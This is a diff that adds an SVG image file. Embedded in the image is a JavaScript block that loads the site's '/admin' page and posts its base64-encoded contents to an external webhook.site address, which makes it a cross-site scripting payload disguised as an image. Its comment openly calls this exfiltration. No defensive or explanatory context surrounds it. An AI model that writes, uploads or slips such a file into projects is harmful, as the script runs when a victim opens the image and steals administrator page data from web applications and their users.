@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
+<script type="text/javascript">
+ // Fetch the admin dashboard and exfiltrate via webhook
+ fetch('/admin')
+ .then(res => res.text())
+ .then(html =>
+ fetch('https://webhook.site/your-unique-id', {
+ method: 'POST',
+ body: btoa(html)
+ })
+ );
+</script>
+</svg>
